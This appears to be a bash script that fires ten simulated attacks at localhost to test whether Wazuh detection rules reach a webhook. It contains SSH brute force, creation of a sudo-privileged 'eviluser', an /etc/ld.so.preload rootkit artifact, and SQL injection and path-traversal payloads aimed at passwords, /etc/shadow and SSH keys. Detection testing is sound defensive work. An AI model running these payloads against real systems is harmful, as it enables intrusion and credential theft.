#!/usr/bin/env bash
# Run the 10 measurable attacks ON this endpoint. Every action is a REAL event
# (real failed SSH logins, real useradd, real file writes, real HTTP requests)
# that the Wazuh agent forwards to the manager, whose built-in rules decode it.
# Rules at level >= 7 reach the custom-vigix integration -> VIGIX webhook.
#
# Usage:  run-attacks.sh [N]     # no arg = all 10; N = just attack N
set -u
TARGET="127.0.0.1"
step() { echo; echo "==================== ATTACK $1: $2 ===================="; }
pause() { sleep "${DELAY:-8}"; }

atk1() { step 1 "SSH brute force (invalid users, wrong passwords) -> rule 5712 L10"
  for u in admin oracle test git postgres ubuntu deploy backup user1 support; do
    sshpass -p "wrongpass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
      -o PreferredAuthentications=password -o PubkeyAuthentication=no \
      "${u}@${TARGET}" exit 2>/dev/null || true
  done; pause; }

atk2() { step 2 "Brute force THEN successful login as 'victim' -> rule 5720/5715 L10"
  for i in 1 2 3 4 5; do
    sshpass -p "badpw${i}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
      -o PreferredAuthentications=password -o PubkeyAuthentication=no \
      "victim@${TARGET}" exit 2>/dev/null || true
  done
  sshpass -p "VictimPass123!" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
    -o PreferredAuthentications=password -o PubkeyAuthentication=no \
    "victim@${TARGET}" "id" 2>/dev/null || true
  pause; }

atk3() { step 3 "New user account created (useradd eviluser) -> rule 5902 L8"
  userdel -r eviluser 2>/dev/null || true
  useradd -m -s /bin/bash eviluser; pause; }

atk4() { step 4 "Privilege escalation: add eviluser to sudo group -> rule 5931/5901 L8"
  usermod -aG sudo eviluser; pause; }

atk5() { step 5 "Account tampering: delete user (userdel eviluser) -> rule 5904 L8"
  userdel -r eviluser 2>/dev/null || true; pause; }

atk6() { step 6 "Malware dropped: EICAR overwrites monitored file (FIM realtime) -> rule 550 L7"
  # EICAR: industry-standard HARMLESS antivirus test string (not real malware).
  # Overwrite a pre-seeded monitored file so FIM reports a MODIFICATION (550,
  # L7 -> forwarded) rather than only a new-file add (554, L5, below threshold).
  printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' \
    > /root/invoice_2026.pdf
  cp /root/invoice_2026.pdf /root/invoice_2026.pdf.exe   # also the dropped executable
  pause; }

atk7() { step 7 "System file modified: /etc/hosts + planted binary (FIM) -> rule 550 L7"
  echo "10.0.0.66  update.trusted-cdn.local" >> /etc/hosts
  cp /bin/ls /usr/local/bin/system-update && echo '# tampered' >> /usr/local/bin/system-update
  pause; }

atk8() { step 8 "Rootkit persistence artifact: /etc/ld.so.preload (FIM new file) -> rule 554/510 L7"
  echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload; pause; }

atk9() { step 9 "SQL injection against web app -> rule 31103 L7 each + 31153 L10 composite"
  # Wazuh rule 31103 (SQLi, level 7 -> forwarded on its OWN) matches LOWERCASE
  # url tokens: select%20 / union%20 / %20from%20 / where%20 / union+ ... so the
  # payloads must be lowercase to match. 10+ of them in 120s also trip 31153 L10.
  local payloads=(
    "id=1%20union%20select%20username,password%20from%20users"
    "id=1%20or%201=1%20union%20select%20null%20from%20dual"
    "id=1%20union%20select%20load_file('/etc/passwd')"
    "name=x%20union%20select%20null,null,null%20from%20users"
    "q=1%20union%20select%20table_name%20from%20information_schema.tables"
    "cat=1%20union%20select%20*%20from%20accounts%20where%201=1"
    "uid=1%20union+select+pass+from+admins"
    "id=1%20union%20select%20credit_card%20from%20payments"
    "page=1%20union%20select%20null%20from%20where%20id=1"
    "item=1%20union%20select%20user%20from%20mysql.user"
    "pid=1%20union%20select%20version%20from%20sys.version"
    "ref=1%20union%20select%20null%20from%20sessions"
  )
  for p in "${payloads[@]}"; do
    curl -s -o /dev/null "http://${TARGET}/app/search.php?${p}" -A "sqlmap/1.7" || true
  done; pause; }

atk10() { step 10 "Directory traversal / common web attack -> rule 31104 L6 each + 31153 L10 composite"
  # rule 31104 (common web attack, L6) matches the literal token '../..' (also
  # 'echo;', 'cmd.exe', 'wget%', ...). 10+ from one source in 120s -> 31153 L10.
  # Payloads all carry a literal '../..' so 31104 matches reliably.
  local paths=(
    "/app/search.php?file=../../../../etc/passwd"
    "/app/search.php?file=../../../../etc/shadow"
    "/app/search.php?page=../../../../etc/hosts"
    "/app/search.php?inc=../../../../../etc/group"
    "/app/search.php?path=../../../../root/.ssh/id_rsa"
    "/app/search.php?doc=../../../../var/log/auth.log"
    "/app/search.php?tpl=../../../../etc/nginx/nginx.conf"
    "/app/search.php?read=../../../../proc/self/environ"
    "/app/search.php?f=../../../../etc/passwd%00.png"
    "/app/search.php?log=../../../../var/log/syslog"
    "/app/search.php?conf=../../../../etc/ssh/sshd_config"
    "/app/search.php?view=../../../../etc/crontab"
    "/app/search.php?cmd=echo;cat%20/etc/passwd"
    "/app/search.php?dl=../../../../etc/passwd"
  )
  for p in "${paths[@]}"; do
    curl -s -o /dev/null "http://${TARGET}${p}" -A "Nikto/2.5" || true
  done; pause; }

run_one() { "atk$1"; }

if [ $# -ge 1 ]; then run_one "$1"; exit 0; fi
echo "### Running all 10 attacks (DELAY=${DELAY:-8}s between each) ###"
for n in $(seq 1 10); do run_one "$n"; done
echo; echo "### Done. Check the Wazuh dashboard / VIGIX inbox for the alerts. ###"
